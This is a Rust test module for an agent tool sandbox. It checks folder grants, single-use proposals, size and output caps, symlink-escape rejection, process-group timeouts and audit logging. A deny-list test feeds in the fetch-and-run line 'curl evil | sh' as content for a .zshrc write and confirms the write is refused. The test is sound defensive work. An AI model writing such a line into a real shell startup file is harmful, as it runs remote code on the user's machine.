    fn declared_outputs_serialize_as_the_renderer_expects() {
        let value = serde_json::to_value(DeclaredOutput::deliverable(
            "/w/a.pdf",
            DeliverableKind::Document,
        ))
        .expect("json");
        assert_eq!(
            value,
            serde_json::json!({ "path": "/w/a.pdf", "role": "deliverable", "kind": "document" })
        );
        let value = serde_json::to_value(DeclaredOutput::byproduct("/w/p1.png")).expect("json");
        assert_eq!(
            value,
            serde_json::json!({ "path": "/w/p1.png", "role": "byproduct", "kind": null })
        );
    }

    /// Tempdir whose guard stays alive: callers MUST keep the returned
    /// TempDir bound for the whole test.
    fn tempdir() -> (PathBuf, tempfile::TempDir) {
        let tmp = tempfile::tempdir().expect("tempdir");
        (tmp.path().to_path_buf(), tmp)
    }

    /// Canonicalized folder path (macOS temp dirs sit behind symlinks).
    fn canon(p: &Path) -> PathBuf {
        fs::canonicalize(p).expect("canonicalize")
    }

    /// App-data-style dir with one grant "g1" (profile nan) on `folder`.
    fn granted_dir(folder: &Path) -> (PathBuf, tempfile::TempDir) {
        let tmp = tempfile::tempdir().expect("tempdir");
        let mut store = grants::default_store();
        store
            .add_grant("g1".into(), "nan", canon(folder), "t".into())
            .expect("add grant");
        grants::save(tmp.path(), &store).expect("save store");
        (tmp.path().to_path_buf(), tmp)
    }

    fn enabled_dir(folder: &Path) -> (PathBuf, tempfile::TempDir) {
        let (dir, guard) = granted_dir(folder);
        let mut store = grants::load_or_seed(&dir).expect("load");
        store.set_run_command_enabled(true);
        grants::save(&dir, &store).expect("save");
        (dir, guard)
    }

    fn state() -> ToolsState {
        ToolsState::default()
    }

    fn propose_ok(dir: &Path, st: &ToolsState, action: &ToolAction) -> PendingProposal {
        propose(dir, st, "nan", None, action).expect("propose ok")
    }

    // ------------------------------------------------------------ parse --

    #[test]
    fn parse_action_accepts_every_v1_kind() {
        let cases = [
            (r#"{"type":"read_file","path":"/a"}"#, "read_file"),
            (r#"{"type":"list_files","path":"/a"}"#, "list_files"),
            (
                r#"{"type":"write_file","path":"/a","content":"x"}"#,
                "write_file",
            ),
            (
                r#"{"type":"replace_file","path":"/a","old":"x","new":"y"}"#,
                "replace_file",
            ),
            (
                r#"{"type":"run_command","cmd":"ls","cwd_in_grant":"/a"}"#,
                "run_command",
            ),
            (r#"{"type":"move_path","from":"/a","to":"/b"}"#, "move_path"),
            (r#"{"type":"delete_path","path":"/a"}"#, "delete_path"),
        ];
        for (json, kind) in cases {
            let action = parse_action(json).expect("parse");
            assert_eq!(action.kind(), kind);
        }
        // overwrite defaults to false: replacing is always explicit.
        assert_eq!(
            parse_action(r#"{"type":"move_path","from":"/a","to":"/b"}"#).expect("move"),
            ToolAction::MovePath {
                from: "/a".into(),
                to: "/b".into(),
                overwrite: false
            }
        );
    }

    #[test]
    fn parse_action_rejects_unknown_kind_and_bad_json() {
        for bad in [
            r#"{"type":"delete_file","path":"/a"}"#,
            "not json",
            r#"{"type":42}"#,
        ] {
            let err = parse_action(bad).expect_err("rejected");
            assert_eq!(err.kind, "unknown_action");
        }
    }

    // ------------------------------------------------------ read_file --

    #[test]
    fn read_file_returns_content() {
        let (folder, _guard) = tempdir();
        fs::write(folder.join("notes.txt"), "hello t8").expect("write");
        let (dir, _guard2) = granted_dir(&folder);
        let st = state();
        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::ReadFile {
                path: canon(&folder).join("notes.txt").display().to_string(),
            },
        );
        assert_eq!(proposal.action.kind(), "read_file");
        let outcome = execute(&dir, &st, &proposal.id).expect("execute");
        assert_eq!(outcome.content.as_deref(), Some("hello t8"));
        assert_eq!(outcome.action, "read_file");
    }

    #[test]
    fn read_file_rejects_oversize() {
        let (folder, _guard) = tempdir();
        let big = vec![b'a'; MAX_FILE_BYTES + 1];
        fs::write(folder.join("big.txt"), &big).expect("write");
        let (dir, _guard2) = granted_dir(&folder);
        let st = state();
        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::ReadFile {
                path: canon(&folder).join("big.txt").display().to_string(),
            },
        );
        let err = execute(&dir, &st, &proposal.id).expect_err("oversize rejected");
        assert_eq!(err.kind, "too_large");
    }

    #[test]
    fn read_file_rejects_binary_with_nul() {
        let (folder, _guard) = tempdir();
        let mut bytes = vec![b'a'; 16];
        bytes.insert(3, 0u8); // NUL within the sniff window
        fs::write(folder.join("blob.bin"), &bytes).expect("write");
        let (dir, _guard2) = granted_dir(&folder);
        let st = state();
        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::ReadFile {
                path: canon(&folder).join("blob.bin").display().to_string(),
            },
        );
        let err = execute(&dir, &st, &proposal.id).expect_err("binary rejected");
        assert_eq!(err.kind, "binary");
        assert!(
            err.message.contains("binary file"),
            "message must say 'binary file'"
        );
    }

    #[test]
    fn read_file_rejects_relative_and_empty_paths() {
        let (folder, _guard) = tempdir();
        let (dir, _guard2) = granted_dir(&folder);
        for bad in ["relative/path.txt", ""] {
            let err = validate_action(
                &grants::load_or_seed(&dir).expect("store"),
                "nan",
                &ToolAction::ReadFile {
                    path: bad.to_string(),
                },
            )
            .expect_err("rejected");
            assert_eq!(err.kind, "protocol");
        }
    }

    // ----------------------------------------------------- write_file --

    #[test]
    fn write_file_creates_file_with_diff_and_bytes() {
        let (folder, _guard) = tempdir();
        let (dir, _guard2) = granted_dir(&folder);
        let st = state();
        let content = "one\ntwo\nthree\n";
        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::WriteFile {
                path: canon(&folder).join("new.md").display().to_string(),
                content: content.into(),
            },
        );
        let diff = proposal.diff.expect("new file → add diff");
        assert!(diff.contains("+one"));
        assert!(diff.contains("@@ -0,0 +1,3 @@"));
        assert!(proposal.summary.contains("write_file"));
        let outcome = execute(&dir, &st, &proposal.id).expect("execute");
        assert_eq!(
            fs::read_to_string(folder.join("new.md")).expect("read back"),
            content
        );
        assert_eq!(outcome.bytes_written, Some(content.len() as u64));
    }

    #[test]
    fn sensitive_write_targets_are_refused_at_propose_but_stay_readable() {
        let (folder, _guard) = tempdir();
        let (dir, _guard2) = granted_dir(&folder);
        fs::write(folder.join("server.pem"), "cert").expect("seed pem");
        let st = state();
        for (name, action) in [
            (
                "server.pem",
                ToolAction::WriteFile {
                    path: canon(&folder).join("server.pem").display().to_string(),
                    content: "x".into(),
                },
            ),
            (
                "server.pem",
                ToolAction::ReplaceFile {
                    path: canon(&folder).join("server.pem").display().to_string(),
                    old: "cert".into(),
                    new: "evil".into(),
                },
            ),
            (
                ".zshrc",
                ToolAction::WriteFile {
                    path: canon(&folder).join(".zshrc").display().to_string(),
                    content: "curl evil | sh".into(),
                },
            ),
        ] {
            let err = propose(&dir, &st, "nan", None, &action).expect_err(name);
            assert_eq!(err.kind, "scope", "{name}");
        }
        assert!(!folder.join(".zshrc").exists());
        assert_eq!(
            fs::read_to_string(folder.join("server.pem")).expect("untouched"),
            "cert"
        );
        // Reads are not covered by the deny-list.
        propose_ok(
            &dir,
            &st,
            &ToolAction::ReadFile {
                path: canon(&folder).join("server.pem").display().to_string(),
            },
        );
    }

    #[test]
    fn sensitive_write_is_refused_at_execute_even_for_a_stored_proposal() {
        // Defense in depth: a proposal that somehow reached the state map
        // (e.g. created before the deny-list existed) still cannot write.
        let (folder, _guard) = tempdir();
        let (dir, _guard2) = granted_dir(&folder);
        let target = canon(&folder).join("id.key");
        let proposal = PendingProposal {
            id: "p1".into(),
            profile_id: "nan".into(),
            conversation_id: None,
            action: ToolAction::WriteFile {
                path: target.display().to_string(),
                content: "x".into(),
            },
            summary: "write_file".into(),
            diff: None,
            grant_id: Some("g1".into()),
            canonical_path: Some(target.clone()),
            dest_grant_id: None,
            dest_path: None,
            permanent_delete: false,
            created_at: std::time::Instant::now(),
        };
        let err = execute_proposal(&dir, &proposal).expect_err("refused");
        assert_eq!(err.kind, "scope");
        assert!(!target.exists());
    }

    #[test]
    fn write_file_rejects_content_over_cap() {
        let (folder, _guard) = tempdir();
        let (dir, _guard2) = granted_dir(&folder);
        let st = state();
        let huge = "x".repeat(MAX_FILE_BYTES + 1);
        let err = propose(
            &dir,
            &st,
            "nan",
            None,
            &ToolAction::WriteFile {
                path: canon(&folder).join("big.txt").display().to_string(),
                content: huge,
            },
        )
        .expect_err("over cap");
        assert_eq!(err.kind, "too_large");
    }

    // ---------------------------------------------------- replace_file --

    #[test]
    fn replace_file_enforces_unique_old() {
        let (folder, _guard) = tempdir();
        let (dir, _guard2) = granted_dir(&folder);
        let st = state();
        let path = canon(&folder).join("doc.txt");
        fs::write(&path, "alpha beta gamma\n").expect("write");

        // 0 matches → not_found at propose.
        let err = propose(
            &dir,
            &st,
            "nan",
            None,
            &ToolAction::ReplaceFile {
                path: path.display().to_string(),
                old: "missing".into(),
                new: "x".into(),
            },
        )
        .expect_err("old not found");
        assert_eq!(err.kind, "not_found");

        // 2 matches → ambiguous.
        fs::write(&path, "dup and dup\n").expect("write");
        let err = propose(
            &dir,
            &st,
            "nan",
            None,
            &ToolAction::ReplaceFile {
                path: path.display().to_string(),
                old: "dup".into(),
                new: "x".into(),
            },
        )
        .expect_err("ambiguous");
        assert_eq!(err.kind, "ambiguous");

        // Exactly 1 match → executes and updates the file.
        fs::write(&path, "alpha beta gamma\n").expect("write");
        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::ReplaceFile {
                path: path.display().to_string(),
                old: "beta".into(),
                new: "BETA".into(),
            },
        );
        assert!(
            proposal
                .diff
                .as_deref()
                .unwrap_or("")
                .contains("+alpha BETA gamma")
        );
        execute(&dir, &st, &proposal.id).expect("execute");
        assert_eq!(
            fs::read_to_string(&path).expect("read back"),
            "alpha BETA gamma\n"
        );
    }

    // ------------------------------------------------------ list_files --

    #[test]
    fn list_files_depth_and_entry_caps() {
        let (folder, _guard) = tempdir();
        fs::create_dir_all(folder.join("sub1/sub2/sub3")).expect("mkdir");
        fs::write(folder.join("a.txt"), "a").expect("write");
        fs::write(folder.join("sub1/b.txt"), "b").expect("write");
        fs::write(folder.join("sub1/sub2/c.txt"), "c").expect("write");
        fs::write(folder.join("sub1/sub2/sub3/d.txt"), "d").expect("write");
        let (dir, _guard2) = granted_dir(&folder);
        let st = state();
        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::ListFiles {
                path: canon(&folder).display().to_string(),
            },
        );
        let outcome = execute(&dir, &st, &proposal.id).expect("execute");
        let entries = outcome.entries.expect("entries");
        let find = |needle: &str| entries.iter().any(|e| e == needle);
        assert!(find("a.txt"));
        assert!(find("sub1/"));
        assert!(find("sub1/b.txt"));
        assert!(find("sub1/sub2/c.txt"), "depth 3 listed");
        assert!(find("sub1/sub2/sub3/"), "depth-3 dir itself listed");
        assert!(
            !entries.iter().any(|e| e.contains("d.txt")),
            "depth 4 not listed"
        );
        let sorted: Vec<String> = entries.clone();
        let mut expected = sorted.clone();
        expected.sort();
        assert_eq!(sorted, expected, "entries are sorted");

        // Entry cap: 600 files → 500 returned + truncated summary.
        let (folder2, _guard3) = tempdir();
        for i in 0..600 {
            fs::write(folder2.join(format!("f{i:03}.txt")), "x").expect("write");
        }
        let (dir2, _guard4) = granted_dir(&folder2);
        let proposal = propose_ok(
            &dir2,
            &st,
            &ToolAction::ListFiles {
                path: canon(&folder2).display().to_string(),
            },
        );
        let outcome = execute(&dir2, &st, &proposal.id).expect("execute");
        let entries = outcome.entries.expect("entries");
        assert_eq!(entries.len(), MAX_LIST_ENTRIES);
        assert!(
            outcome.summary.contains("truncated"),
            "summary must note truncation"
        );
    }

    #[cfg(unix)]
    #[test]
    fn list_files_does_not_descend_symlinked_dirs() {
        let (folder, _guard) = tempdir();
        let (outside, _guard2) = tempdir();
        fs::write(outside.join("secret.txt"), "s").expect("write");
        #[cfg(unix)]
        std::os::unix::fs::symlink(&outside, folder.join("link")).expect("symlink");
        #[cfg(unix)]
        {
            let (dir, _guard3) = granted_dir(&folder);
            let st = state();
            let proposal = propose_ok(
                &dir,
                &st,
                &ToolAction::ListFiles {
                    path: canon(&folder).display().to_string(),
                },
            );
            let outcome = execute(&dir, &st, &proposal.id).expect("execute");
            let entries = outcome.entries.expect("entries");
            assert!(
                entries.iter().any(|e| e.starts_with("link")),
                "symlink entry itself is listed"
            );
            assert!(
                !entries.iter().any(|e| e.contains("secret.txt")),
                "symlinked dir is never descended into"
            );
        }
    }

    // ---------------------------------------------------- proposal flows --

    #[test]
    fn propose_rejects_unknown_profile() {
        let (folder, _guard) = tempdir();
        let (dir, _guard2) = granted_dir(&folder);
        let st = state();
        let err = propose(
            &dir,
            &st,
            "nope",
            None,
            &ToolAction::ReadFile {
                path: canon(&folder).join("f.txt").display().to_string(),
            },
        )
        .expect_err("unknown profile");
        assert_eq!(err.kind, "protocol");
    }

    #[test]
    fn proposal_is_single_use() {
        let (folder, _guard) = tempdir();
        fs::write(folder.join("f.txt"), "x").expect("write");
        let (dir, _guard2) = granted_dir(&folder);
        let st = state();
        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::ReadFile {
                path: canon(&folder).join("f.txt").display().to_string(),
            },
        );
        execute(&dir, &st, &proposal.id).expect("first execute");
        let err = execute(&dir, &st, &proposal.id).expect_err("second execute");
        assert_eq!(err.kind, "unknown_proposal");
    }

    #[test]
    fn proposal_expires_after_ttl() {
        let (folder, _guard) = tempdir();
        fs::write(folder.join("f.txt"), "x").expect("write");
        let (dir, _guard2) = granted_dir(&folder);
        let st = ToolsState {
            ttl: Duration::ZERO,
            ..ToolsState::default()
        };
        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::ReadFile {
                path: canon(&folder).join("f.txt").display().to_string(),
            },
        );
        std::thread::sleep(Duration::from_millis(5));
        let err = execute(&dir, &st, &proposal.id).expect_err("expired");
        assert_eq!(err.kind, "expired");
    }

    #[test]
    fn deny_consumes_proposal() {
        let (folder, _guard) = tempdir();
        fs::write(folder.join("f.txt"), "x").expect("write");
        let (dir, _guard2) = granted_dir(&folder);
        let st = state();
        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::ReadFile {
                path: canon(&folder).join("f.txt").display().to_string(),
            },
        );
        deny(&dir, &st, &proposal.id).expect("deny");
        let err = execute(&dir, &st, &proposal.id).expect_err("denied proposal cannot execute");
        assert_eq!(err.kind, "unknown_proposal");
        deny(&dir, &st, "missing-id").expect("deny of unknown id is a no-op");
    }

    // ------------------------------------------------------- run_command --

    #[test]
    fn run_command_on_by_default_and_refused_when_switched_off() {
        let (folder, _guard) = tempdir();
        let (dir, _guard2) = granted_dir(&folder);
        let mut store = grants::load_or_seed(&dir).expect("store");
        assert!(store.tools_allow_run_command, "S15: default ON");
        let action = ToolAction::RunCommand {
            cmd: "ls".into(),
            cwd_in_grant: canon(&folder).display().to_string(),
        };
        validate_action(&store, "nan", &action).expect("default ON validates");
        store.set_run_command_enabled(false);
        let err = validate_action(
            &store,
            "nan",
            &ToolAction::RunCommand {
                cmd: "ls".into(),
                cwd_in_grant: canon(&folder).display().to_string(),
            },
        )
        .expect_err("disabled");
        assert_eq!(err.kind, "disabled");
    }

    #[cfg(unix)]
    #[test]
    fn run_command_enabled_runs_and_captures() {
        let (folder, _guard) = tempdir();
        let (dir, _guard2) = enabled_dir(&folder);
        let st = state();
        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::RunCommand {
                cmd: "echo hi".into(),
                cwd_in_grant: canon(&folder).display().to_string(),
            },
        );
        let outcome = execute(&dir, &st, &proposal.id).expect("execute");
        assert_eq!(outcome.stdout.as_deref(), Some("hi\n"));
        assert_eq!(outcome.exit_code, Some(0));
        assert!(!outcome.timed_out);
    }

    /// Round-3 regression (owner session, conversation 8): the model ran
    /// `mkdir -p X && cd X && cat > …` with `cwd` = X, the folder the
    /// command itself creates. The execute-time re-verification required
    /// the cwd to already exist and failed with `path no longer resolves`.
    /// A missing cwd inside the grant is now created before the command.
    #[cfg(unix)]
    #[test]
    fn run_command_one_shot_mkdir_cd_succeeds_when_cwd_is_the_new_folder() {
        let (folder, _guard) = tempdir();
        let root = canon(&folder);
        let (dir, _guard2) = granted_dir(&folder);
        set_grant_mode(&dir, "g1", ApprovalMode::Allow);
        let st = state();
        let approver = FakeApprover::answering(false);
        let target = root.join("informe-bbva");
        let cmd = format!(
            "mkdir -p {t} && cd {t} && printf '<h1>hola</h1>' > index.html",
            t = target.display()
        );
        let (route, outcome) = run_with(
            &dir,
            &st,
            &approver,
            &ToolAction::RunCommand {
                cmd,
                cwd_in_grant: path_str(&target),
            },
        )
        .expect("one-shot mkdir && cd command runs");
        assert_eq!(route, ApprovalRoute::Auto);
        assert_eq!(outcome.exit_code, Some(0), "stderr: {:?}", outcome.stderr);
        let html = target.join("index.html");
        assert_eq!(fs::read_to_string(&html).expect("html"), "<h1>hola</h1>");
        assert_eq!(outcome.produced, vec![path_str(&html)]);
    }

    #[cfg(unix)]
    #[test]
    fn run_command_one_shot_mkdir_cd_succeeds_from_the_parent() {
        let (folder, _guard) = tempdir();
        let root = canon(&folder);
        let (dir, _guard2) = enabled_dir(&folder);
        let st = state();
        let target = root.join("web");
        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::RunCommand {
                cmd: "mkdir -p web && cd web && echo '<p>x</p>' > index.html".into(),
                cwd_in_grant: path_str(&root),
            },
        );
        let outcome = execute(&dir, &st, &proposal.id).expect("execute");
        assert_eq!(outcome.exit_code, Some(0));
        assert_eq!(outcome.produced, vec![path_str(&target.join("index.html"))]);
    }

    #[cfg(unix)]
    #[test]
    fn run_command_missing_cwd_behind_a_dangling_symlink_is_refused() {
        let (folder, _guard) = tempdir();
        let (outside, _guard3) = tempdir();
        let root = canon(&folder);
        let (dir, _guard2) = enabled_dir(&folder);
        let st = state();
        // `link` dangles into a not-yet-existing folder OUTSIDE the grant:
        // creating `link/sub` would materialize it out there.
        let escape_target = canon(&outside).join("not-yet");
        std::os::unix::fs::symlink(&escape_target, root.join("link")).expect("symlink");
        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::RunCommand {
                cmd: "echo hi".into(),
                cwd_in_grant: path_str(&root.join("link").join("sub")),
            },
        );
        let err = execute(&dir, &st, &proposal.id).expect_err("symlink component");
        assert_eq!(err.kind, "escape");
        assert!(!escape_target.exists(), "nothing created outside the grant");
    }

    #[test]
    fn run_command_cwd_that_is_a_file_is_refused() {
        let (folder, _guard) = tempdir();
        let root = canon(&folder);
        fs::write(root.join("notes.txt"), "x").expect("write");
        let (dir, _guard2) = enabled_dir(&folder);
        let st = state();
        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::RunCommand {
                cmd: "echo hi".into(),
                cwd_in_grant: path_str(&root.join("notes.txt")),
            },
        );
        let err = execute(&dir, &st, &proposal.id).expect_err("file cwd");
        assert_eq!(err.kind, "not_a_folder");
    }

    /// Every file a command creates or changes is reported (preview chips),
    /// files it did not touch are not — including absolute paths outside
    /// its cwd but inside the grant.
    #[cfg(unix)]
    #[test]
    fn run_command_reports_only_the_files_it_produced() {
        let (folder, _guard) = tempdir();
        let root = canon(&folder);
        fs::create_dir_all(root.join("site")).expect("mkdir");
        fs::create_dir_all(root.join("other")).expect("mkdir");
        fs::write(root.join("site/old.css"), "old").expect("write");
        // Untouched before the command: an mtime well in the past (the
        // detection floors the start time to whole seconds).
        fs::File::options()
            .write(true)
            .open(root.join("site/old.css"))
            .and_then(|file| file.set_modified(SystemTime::now() - Duration::from_secs(120)))
            .expect("age old.css");
        let (dir, _guard2) = enabled_dir(&folder);
        let st = state();
        let report = root.join("other/report.pdf");
        let cmd = format!(
            "echo '<p>x</p>' > index.html && mkdir -p .cache && echo c > .cache/x.txt && echo pdf > {}",
            report.display()
        );
        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::RunCommand {
                cmd,
                cwd_in_grant: path_str(&root.join("site")),
            },
        );
        let outcome = execute(&dir, &st, &proposal.id).expect("execute");
        assert_eq!(outcome.exit_code, Some(0));
        assert_eq!(
            outcome.produced,
            vec![path_str(&report), path_str(&root.join("site/index.html"))],
            "hidden folders and untouched files are not reported"
        );
    }

    #[test]
    fn file_writes_report_the_produced_file() {
        let (folder, _guard) = tempdir();
        let root = canon(&folder);
        let (dir, _guard2) = granted_dir(&folder);
        let st = state();
        let target = root.join("index.html");
        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::WriteFile {
                path: path_str(&target),
                content: "<p>hola</p>".into(),
            },
        );
        let outcome = execute(&dir, &st, &proposal.id).expect("write");
        assert_eq!(outcome.produced, vec![path_str(&target)]);
        let moved = root.join("web.html");
        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::MovePath {
                from: path_str(&target),
                to: path_str(&moved),
                overwrite: false,
            },
        );
        let outcome = execute(&dir, &st, &proposal.id).expect("move");
        assert_eq!(outcome.produced, vec![path_str(&moved)]);
    }

    #[cfg(unix)]
    #[test]
    fn run_command_timeout_kills_process() {
        let (folder, _guard) = tempdir();
        let started = Instant::now();
        let output = run_captured("sleep 5", &folder, Duration::from_millis(100)).expect("run");
        assert!(output.timed_out);
        assert!(
            started.elapsed() < Duration::from_secs(3),
            "killed, not waited out"
        );
    }

    #[cfg(unix)]
    #[test]
    fn run_command_output_capped() {
        let (folder, _guard) = tempdir();
        let output = run_captured("seq 1 20000", &folder, COMMAND_TIMEOUT).expect("run");
        assert!(output.stdout_truncated, "20000 lines exceed 64 KiB");
        assert_eq!(output.stdout.len(), MAX_OUTPUT_BYTES);
    }

    #[test]
    fn run_command_rejects_cwd_outside_grants() {
        let (folder, _guard) = tempdir();
        let (outside, _guard2) = tempdir();
        let (dir, _guard3) = enabled_dir(&folder);
        let store = grants::load_or_seed(&dir).expect("store");
        let err = validate_action(
            &store,
            "nan",
            &ToolAction::RunCommand {
                cmd: "ls".into(),
                cwd_in_grant: canon(&outside).display().to_string(),
            },
        )
        .expect_err("cwd outside grants");
        assert_eq!(err.kind, "escape");
    }

    #[test]
    fn execute_rechecks_run_command_flag() {
        let (folder, _guard) = tempdir();
        let (dir, _guard2) = enabled_dir(&folder);
        let st = state();
        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::RunCommand {
                cmd: "echo hi".into(),
                cwd_in_grant: canon(&folder).display().to_string(),
            },
        );
        // Flag flipped OFF between propose and execute.
        let mut store = grants::load_or_seed(&dir).expect("store");
        store.set_run_command_enabled(false);
        grants::save(&dir, &store).expect("save");
        let err = execute(&dir, &st, &proposal.id).expect_err("flag rechecked");
        assert_eq!(err.kind, "disabled");
    }

    #[test]
    fn execute_after_grant_revocation_rejected() {
        let (folder, _guard) = tempdir();
        fs::write(folder.join("f.txt"), "x").expect("write");
        let (dir, _guard2) = granted_dir(&folder);
        let st = state();
        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::ReadFile {
                path: canon(&folder).join("f.txt").display().to_string(),
            },
        );
        let mut store = grants::load_or_seed(&dir).expect("store");
        store.revoke("g1");
        grants::save(&dir, &store).expect("save");
        let err = execute(&dir, &st, &proposal.id).expect_err("revoked");
        assert_eq!(err.kind, "no_grant");
    }

    // ------------------------------------------------------------- audit --

    #[test]
    fn audit_trail_records_propose_execute_deny_without_content() {
        let (folder, _guard) = tempdir();
        let (dir, _guard2) = granted_dir(&folder);
        let st = state();
        let marker = "CANARY-CONTENT-must-not-appear-in-audit";
        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::WriteFile {
                path: canon(&folder).join("a.md").display().to_string(),
                content: marker.into(),
            },
        );
        execute(&dir, &st, &proposal.id).expect("execute");
        let other = propose_ok(
            &dir,
            &st,
            &ToolAction::ReadFile {
                path: canon(&folder).join("a.md").display().to_string(),
            },
        );
        deny(&dir, &st, &other.id).expect("deny");

        let raw = fs::read_to_string(dir.join(audit::AUDIT_FILE)).expect("audit log");
        let events: Vec<String> = raw
            .lines()
            .filter_map(|line| serde_json::from_str::<serde_json::Value>(line).ok())
            .filter_map(|v| v.get("event").and_then(|e| e.as_str()).map(str::to_string))
            .collect();
        assert!(events.iter().any(|e| e == "propose"));
        assert!(events.iter().any(|e| e == "approve"));
        assert!(events.iter().any(|e| e == "execute"));
        assert!(events.iter().any(|e| e == "deny"));
        assert!(
            !raw.contains(marker),
            "audit log must never contain file contents"
        );
    }

    #[test]
    fn summaries_and_rejections_stay_content_free() {
        let (folder, _guard) = tempdir();
        let (dir, _guard2) = granted_dir(&folder);
        let st = state();
        let secret = "TOP-SECRET-FILE-BODY";
        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::WriteFile {
                path: canon(&folder).join("s.txt").display().to_string(),
                content: secret.into(),
            },
        );
        assert!(
            !proposal.summary.contains(secret),
            "summary never carries content"
        );
        assert!(
            proposal.diff.is_some(),
            "the proposal DIFF may carry content (that is its job)"
        );
    }

    // ------------------------------------------------- B1 write escape --

    /// Dangling-intermediate setup with clean guard ownership: the grant
    /// folder, the outside folder and the app-data dir (all guards kept).
    #[cfg(unix)]
    #[test]
    fn write_rejects_intermediate_symlink_at_execute() {
        let (folder, outside, dir, _anchor) = simple_dangling_setup();
        let st = state();
        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::WriteFile {
                path: canon(&folder)
                    .join("blink")
                    .join("evil.txt")
                    .display()
                    .to_string(),
                content: "x".into(),
            },
        );
        // Still dangling at execute: the rejection must be `escape` (a
        // symlink component), not a confusing `io` from a failed open.
        let err = execute(&dir, &st, &proposal.id).expect_err("must be rejected");
        assert_eq!(err.kind, "escape");
        assert!(
            !outside.join("later").exists(),
            "nothing outside was touched"
        );
    }

    #[cfg(unix)]
    #[test]
    fn write_cannot_follow_materialized_intermediate_target() {
        let (folder, outside, dir, _anchor) = simple_dangling_setup();
        let st = state();
        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::WriteFile {
                path: canon(&folder)
                    .join("blink")
                    .join("evil.txt")
                    .display()
                    .to_string(),
                content: "x".into(),
            },
        );
        // The symlink target materializes during the approve window.
        fs::create_dir_all(outside.join("later")).expect("materialize");
        let err = execute(&dir, &st, &proposal.id).expect_err("must not follow");
        assert_eq!(err.kind, "escape");
        assert!(
            !outside.join("later").join("evil.txt").exists(),
            "the write must never land outside the grant"
        );
    }

    /// Grant folder + `G/blink -> <outside>/later` dangling symlink, with
    /// clean guard ownership (all guards kept alive in the returned Vec).
    #[cfg(unix)]
    fn simple_dangling_setup() -> (PathBuf, PathBuf, PathBuf, Vec<tempfile::TempDir>) {
        let (folder, guard1) = tempdir();
        let (outside, guard2) = tempdir();
        std::os::unix::fs::symlink(outside.join("later"), folder.join("blink")).expect("symlink");
        let (dir, guard3) = granted_dir(&folder);
        (folder, outside, dir, vec![guard1, guard2, guard3])
    }

    // ------------------------------------------------------- B2 bounds --

    #[test]
    fn list_files_scan_is_bounded_huge_flat_dir() {
        // Structural bound (MAX_LIST_SCAN): read_dir stops early so a huge
        // flat folder cannot be fully buffered. Externally the contract is
        // unchanged: 500 sorted entries + truncated note.
        let (folder, _guard) = tempdir();
        for i in 0..2000 {
            fs::write(folder.join(format!("g{i:04}.txt")), "x").expect("write");
        }
        let (dir, _guard2) = granted_dir(&folder);
        let st = state();
        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::ListFiles {
                path: canon(&folder).display().to_string(),
            },
        );
        let outcome = execute(&dir, &st, &proposal.id).expect("execute");
        let entries = outcome.entries.expect("entries");
        assert_eq!(entries.len(), MAX_LIST_ENTRIES);
        assert!(entries[0].starts_with("g0000"), "entries stay sorted");
        assert!(outcome.summary.contains("truncated"));
    }

    // -------------------------------------------------- B3 run_command --

    #[cfg(unix)]
    #[test]
    fn run_command_returns_despite_grandchild_holding_pipes() {
        // sh -c "sleep 30 & echo hi": the backgrounded sleep keeps the
        // stdout pipe open after the shell exits. run_captured must return
        // bounded instead of blocking on the drain threads forever (B3).
        let (folder, _guard) = tempdir();
        let (tx, rx) = std::sync::mpsc::channel();
        let started = Instant::now();
        std::thread::spawn(move || {
            let out = run_captured("sleep 30 & echo hi", &folder, COMMAND_TIMEOUT);
            let _ = tx.send((out, started.elapsed()));
        });
        let (out, elapsed) = rx
            .recv_timeout(Duration::from_secs(20))
            .expect("run_captured must return despite a pipe-holding grandchild");
        let out = out.expect("run ok");
        assert_eq!(out.stdout, "hi\n", "partial output is still captured");
        assert_eq!(out.exit_code, Some(0));
        assert!(!out.timed_out);
        assert!(
            elapsed < Duration::from_secs(15),
            "bounded return, not the grandchild's 30s: {elapsed:?}"
        );
    }

    #[cfg(unix)]
    #[test]
    fn run_command_timeout_kills_process_group() {
        // "sleep 30; echo done" forces sh to fork (no exec optimization):
        // the timeout kill must take the whole process GROUP, or the forked
        // sleep keeps the pipes open past the kill (B3).
        let (folder, _guard) = tempdir();
        let started = Instant::now();
        let out =
            run_captured("sleep 30; echo done", &folder, Duration::from_millis(500)).expect("run");
        assert!(out.timed_out);
        assert_eq!(out.stdout, "", "killed before echo ran");
        assert!(
            started.elapsed() < Duration::from_secs(5),
            "group kill closes the pipes: {:?}",
            started.elapsed()
        );
    }

    // ------------------------------------------------------- B4 audit --

    #[test]
    fn propose_audits_rejections() {
        // Escape attempts are the most valuable security signal: they must
        // leave a propose/rejected trace (paths only, never contents).
        let (folder, _guard) = tempdir();
        let (outside, _guard2) = tempdir();
        let (dir, _guard3) = granted_dir(&folder);
        let st = state();
        let err = propose(
            &dir,
            &st,
            "nan",
            None,
            &ToolAction::WriteFile {
                path: canon(&outside).join("evil.txt").display().to_string(),
                content: "x".into(),
            },
        )
        .expect_err("escape");
        assert_eq!(err.kind, "escape");
        let entries = audit::tail(&dir, 10).expect("tail");
        let last = entries.last().expect("rejection must be audited");
        assert_eq!(last.event, "propose");
        assert_eq!(last.outcome, "rejected");
        assert_eq!(last.action, "write_file");
        assert!(
            last.detail
                .as_deref()
                .unwrap_or("")
                .contains("outside every folder"),
            "detail carries the path summary"
        );
